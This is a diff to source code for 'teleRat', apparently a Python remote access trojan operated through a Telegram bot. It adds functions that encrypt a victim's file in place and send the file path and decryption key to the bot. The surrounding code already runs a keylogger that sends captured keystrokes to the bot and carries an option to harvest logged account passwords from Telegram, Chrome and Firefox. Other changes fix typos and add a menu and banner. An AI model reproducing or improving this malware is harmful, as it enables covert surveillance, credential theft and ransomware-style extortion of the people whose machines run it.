@@ -4,7 +4,8 @@ Author: Yakuza.D(daya)
 Github: https://github.com/pythonInBlack/teleRat
 
 '''
-
+from banner_print import print_teleRat_banner 
+#from ..modules.banner_print import print_dir_banner as dirBanner
 
 import requests
 from bs4 import BeautifulSoup
@@ -21,6 +22,7 @@ from colorama import Fore, Back, Style
 # from telegram import Update
 # from telegram.ext import Application, CommandHandler, ContextTypes
 from pynput import keyboard
+from cryptography.fernet import Fernet
 
 userIp  = ''
 userLocation = ''
@@ -35,7 +37,9 @@ class TeleManager():
         self.keys = []
         self.procs = {}
         self.commonAccountProcessNames = ['Telegram.exe','chrome.exe','firefox.exe']
-
+        self.keyData = []
+        self.keyFilesData = []
+        self.encryptFile = ''
     def ip_enum(self):
         '''
     summary 
@@ -165,7 +169,7 @@ class TeleManager():
             Operation System: {platform.system()} 💻
             OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
             Host Name: {platform.uname().node} 
-            OS CPU Family: {platform.procsessor()} => {platform.uname().machine}            
+            OS CPU Family: {platform.processor()} => {platform.uname().machine}            
             OS CPU Model: {osCpuFormated}
             OS Detailed Version: {platform.win32_ver()}
             
@@ -278,8 +282,9 @@ class TeleManager():
          # Check for CTRL+C  
         if key == keyboard.Key.ctrl_r:  
             print(Fore.GREEN + '[+] Key Logger - Right-CTRL Detected, Exiting...' + Style.RESET_ALL)
-            self.send_message(f'Keylogger Stopped ⛔, Until Now Target Pressed => \n{self.keys}')
-            self.keys.clear()
+            if len(self.keys) > 0:  
+                self.send_message(f'Keylogger Stopped ⛔, Until Now Target Pressed => \n{self.keys}')
+                self.keys.clear()
             return False
             
     
@@ -312,12 +317,12 @@ class TeleManager():
         pids = psutil.pids()
         
         for pid in pids:
-            self.procs.update({psutil.procsess(pid).name():pid})
+            self.procs.update({psutil.Process(pid).name():pid})
         
-        print(Fore.LIGHTGREEN_EX+f'[+] procsess List => \n'+Style.RESET_ALL)
+        print(Fore.LIGHTGREEN_EX+f'[+] Process List => \n'+Style.RESET_ALL)
 
         for name,pid in self.procs.items():
-            print(Fore.YELLOW+f'[+] procsess => '+Fore.LIGHTWHITE_EX+ name + f' {pid}' +Style.RESET_ALL)
+            print(Fore.YELLOW+f'[+] Process => '+Fore.LIGHTWHITE_EX+ name + f' {pid}' +Style.RESET_ALL)
         
         return self.procs
     
@@ -349,6 +354,115 @@ class TeleManager():
         except Exception as e:
             print(Fore.LIGHTRED_EX + '[-] Accounts KeyLogger => Unknown Error happened...'+Style.RESET_ALL)
             print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
+    
+    def text_encryptor(self):
+        print(Back.WHITE+Fore.BLACK+f'[🔐] Text Encryptor => '+Style.RESET_ALL+'\n')
+        text = input(Fore.YELLOW+'[+] Encryptor => Enter text to be Encrypted: '+Style.RESET_ALL)
+
+        key = Fernet.generate_key()
+
+        encryptData = Fernet(key).encrypt(text.encode())
+
+        with open("key_data.txt","w") as f:
+            f.write('Key: \n')
+            f.write(f'{key.decode()}\n')
+            f.write('Data Content: \n')
+            f.write(f'{encryptData.decode()}\n')
+
+        subprocess.Popen("notepad .\\key_data.txt", shell=True)
+
+        print(f'[+] Encryptor => Your Key Is: {key.decode()} \n')
+        print(f'[+] Encryptor => Encrypted Data Is: {encryptData.decode()} \n')
+
+        #keyData = []
+        with open("key_data.txt","r") as f:
+            for line in f:
+                self.keyData.append(line.strip())
+        #Send key and encrypted data to bot
+        self.send_message(f'[+] Encryptor => Original Text {text} \nDecryption Key 🔑 Is: \n{key.decode()} \n'+f'[+] Encryptor => Encrypted Data 🔐 Is: \n{encryptData.decode()} \n')
+    
+        #keyUsed = b'SeExLvFTMx0Cxq5caUq1XSbpUYTB06kjb07y8NwIZp4='
+        #encData = b'gAAAAABmy5AMSPIeyohe_uFlBqphCLMOjFt_eQSTZMCTUcixuey5WSGoIYXE5ECxM1wOTpz51RjDph6Fh7LAkIr3hLUahKSxSw=='
+        
+        decryptor = Fernet(self.keyData[1]).decrypt(self.keyData[3])
+        
+        print(Fore.LIGHTCYAN_EX+f'[+] Encryptor => Decrypted Data Is: {decryptor.decode()} \n')
+        
+        #self.send_message(f'[+] Encryptor => {"data":decryptor.decode()} \n{"key":key.decode()} \n{"encryptData":encryptData.decode()} \n')
+        
+        return {"data":decryptor.decode(),"key":key.decode(),"encryptData":encryptData.decode()}
+    
+    def text_decryptor(self):
+        key = input(Fore.YELLOW+'[+] Text Decryptor => Paste Key: '+Style.RESET_ALL+'\n')
+        data = input(Fore.YELLOW+'[+] Text Decryptor => Paste Encrypted Data: \n'+Style.RESET_ALL)
+        
+        decryptor = Fernet(key).decrypt(data)
+        print(Fore.LIGHTCYAN_EX+f'[+] Text Decryptor => Decrypted Data Is: {decryptor.decode()} \n')
+        
+        return {"data":decryptor.decode(),"key":key.decode(),"encryptData":data.decode()}
+
+    def file_encryptor(self):
+        path = input('[+] File Encryptor => Enter file path to be Encrypted: ')
+        with open(rf'{path}','rb') as f:
+            dataFile = f.read()
+        
+        key = Fernet.generate_key()
+        
+        encryptData = Fernet(key).encrypt(dataFile)
+        
+        self.keyFilesData.append(key.decode())
+        self.keyFilesData.append(encryptData.decode())
+        self.encryptFile = path
+        print(f'[+] File Encryptor => File Encrypted & Encryption Key Is: {key.decode()} \n')
+        
+        self.send_message(f'[+] File Encryptor => File Encrypted: {path} \n & Encryption Key Is: {key.decode()} \n')
+        
+        #Write key to file
+        with open("key_data.txt","w") as f:
+            f.write('Key: \n')
+            f.write(f'{key.decode()}\n')
+            f.write('Data Content: \n')
+            f.write(f'{encryptData.decode()}\n')
+        
+        subprocess.Popen("notepad .\\key_data.txt", shell=True)
+            
+        #Write Encrypted Data to file
+        with open(rf'{path}','wb') as encryptFile:
+            encryptFile.write(encryptData)
+        
+    def file_decryptor(self, key=''):
+        print(Back.BLUE+Fore.YELLOW+f'[+] File Decryptor => Leave key Empty to Decrypt Last Encrpted file.'+Style.RESET_ALL+'\n')
+        key = input(Fore.YELLOW+'[+] File Decryptor => Paste Encryption Key: '+Style.RESET_ALL)
+        
+        if key == "":
+            fileExt = self.encryptFile.split('.')[1]
+            decryptor = Fernet(self.keyFilesData[0]).decrypt(self.keyFilesData[1])
+            print(f'[+] File Decryptor => File Decrypted & Decryption Key Is: \n{self.keyFilesData[0]} \n')
+            
+            with open(rf'{self.encryptFile}_decrypted.{fileExt}','wb') as decryptFile:
+                decryptFile.write(decryptor)
+                
+            subprocess.Popen(rf'start ./{self.encryptFile}_decrypted.{fileExt}', shell=True)
+            
+        else:
+            encryptedData = input('[+] File Decryptor => Enter path of Encrypted File: ')
+            fileExt = encryptedData.split('.')[1]
+            
+            with open(encryptedData,'rb') as f:
+                dataFile = f.read()
+                
+            decryptor = Fernet(key.encode()).decrypt(dataFile)
+            
+            print(f'[+] File Decryptor => File Decrypted & Decryption Key Is: \n{key[1]} \n')
+            with open(rf'{encryptedData}_decrypted.{fileExt}','wb') as decryptFile:
+                decryptFile.write(decryptor)
+            
+            subprocess.Popen(rf'start ./{encryptedData}_decrypted.{fileExt}', shell=True)
+        #decryptor()
+
+        # with open(rf'{path}','wb') as f:
+        #     f.write(encryptData)
+
     def list_command(self):
         '''summary
         This function send List of Commands to user
@@ -373,14 +487,17 @@ class TeleManager():
     def usage_options(self):
         userInput = ''
         options = '''
+        -----------------------------------------------------------------------
         [0] => Send Message 
         [1] => OS Enumeration 
         [2] => IP Enumeration 
         [3] => Last Command from Bot 
         [4] => All Commands from Bot 
         [5] => Keyboard Logger
-        [6] => procsess List
+        [6] => Process List
         [7] => Logged Accounts Passwords
+        [8] => Text Encryptor && [88] Text Decryptor
+        [9] => File Encryptor && [99] File Decryptor
          
         🥷
         [q] => Exit with Notification 👋👋👋
@@ -417,6 +534,18 @@ class TeleManager():
         elif userInput == '7':
             return 'logacc', 7
         
+        elif userInput == '8':
+            return 'textencrypt', 8
+        elif userInput == '88':
+            return 'textdecrypt', 88
+
+        elif userInput == '9':
+            return 'fileencrypt', 9
+
+        elif userInput == '99':
+            return 'filedecrypt', 99
+        
+        
         elif userInput.lower() == 'h':
             return 'help', 'h'
             
@@ -436,59 +565,6 @@ class TeleManager():
         self.send_message('Client Side python script Shuting down...! 📴 ')
         exit()
         
-
-# class TeleRat(TeleManager):
-#     def __init__(self, token, userId):
-#         super().__init__(token, userId)
-#         self.token = token
-#         self.userId = userId
-#         self.userIp = ''
-#         self.userLocation = ''
-#         self.allCommands = self.all_commands()
-    
-#     def tester(self):
-#         super().last_command()
-#         self.list_command()
-#         return self.allCommands
-    
-#     def do_command(self):
-#         '''summary
-#         this function get last command from bot and then execute it
-#         '''
-#         lastCmd = self.last_command()
-        
-        
-# class BotHandler():   
-#     def __init__(self, token):
-#         self.token = token
-        
-#     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-#         await update.message.replay_text('Hello Ninja 🥷👋👋👋')
-    
-#     async def help(self, update, context):
-#         await update.message.reply_text('''
-#         /list => Show List of Commands \n
-#         /send => Send New Message \n
-#         /none => Run New Command \n
-#         /os => Get OS Information \n
-#         /ip => Get IP Information \n
-#         /help => Get Help \n
-#         /exit => Exit from Bot \n
-#         ''')
-        
-#     async def main(self):
-#         #Build Application
-#         application = Application.builder().token(self.token).build()
-        
-#         #Add Command Handlers to Bot
-#         application.add_handler(CommandHandler('start', self.start))
-#         application.add_handler(CommandHandler('help', self.help))
-        
-#         await application.initialize()
-#         await application.start()
-#         await application.updater.start_polling()
-#         #await application.run_until_disconnected()
-    
 
         
 def bot_runner():
@@ -541,6 +617,18 @@ def bot_runner():
             telegram.log_accounts()
             continue
         
+        elif option[0] == 'textencrypt':
+            telegram.text_encryptor()
+            continue
+        elif option[0] == 'textdecrypt':
+            telegram.text_decryptor()
+            continue
+        
+        elif option[0] == 'fileencrypt':
+            telegram.file_encryptor()
+        elif option[0] == 'filedecrypt':
+            telegram.file_decryptor()
+        
         #telegram.send_message(telegram.os_enum())
 def rat_runner():
     import asyncio
@@ -561,13 +649,16 @@ def rat_runner():
     
 
 def main():
-    #bot_runner()
-    #print(f'[+] IP: {userIp} in {userLocation} Country')
     try:
         bot_runner()
     except KeyboardInterrupt:
         print(Fore.LIGHTRED_EX + '[-] CTRL+C Detecting => Exit !!!'+Style.RESET_ALL)
 
 if __name__ == '__main__':
-    
-    main()
+    try:
+        print_teleRat_banner()
+        input(Back.WHITE+Fore.BLACK+ "Welcom to 'T-Rat CLI Dashboard' Ninja 🥷 "+ Back.RESET+Fore.LIGHTWHITE_EX+' Press Enter to Start...'+Style.RESET_ALL+'\n')
+        main()
+    except KeyboardInterrupt:
+        print(Fore.LIGHTRED_EX + '[-] CTRL+C Detecting => Exit !!!'+Style.RESET_ALL)
+
